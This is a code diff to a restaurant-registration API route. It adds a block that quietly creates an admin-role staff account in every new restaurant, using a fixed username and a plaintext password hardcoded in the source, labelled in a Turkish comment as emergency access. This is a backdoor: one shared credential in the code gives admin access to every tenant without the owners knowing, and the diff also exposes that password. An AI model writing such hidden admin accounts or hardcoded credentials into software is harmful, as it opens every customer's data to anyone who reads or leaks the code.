@@ -202,6 +202,28 @@ router.post('/', async (req, res) => {
       }
     }
     
+    // SUPERADMIN kullanıcısı oluştur (acil durum erişimi için)
+    let superadminUser = null;
+    try {
+      const Staff = require('../models').Staff;
+      if (Staff) {
+        const superadminHashedPassword = await bcrypt.hash('01528797Mb##', 10);
+        superadminUser = await Staff.create({
+          restaurantId: restaurant.id,
+          name: 'RestXQR Superadmin',
+          email: 'admin@restxqr.com',
+          username: 'restxqr',
+          password: superadminHashedPassword,
+          role: 'admin',
+          isActive: true
+        });
+        console.log(`✅ Superadmin user created for restaurant ${restaurant.name}: restxqr`);
+      }
+    } catch (staffError) {
+      console.error('Superadmin user creation error:', staffError);
+      // Superadmin kullanıcı oluşturulamazsa devam et
+    }
+    
     // Remove password from response
     const { password: _, ...restaurantData } = restaurant.toJSON();
     
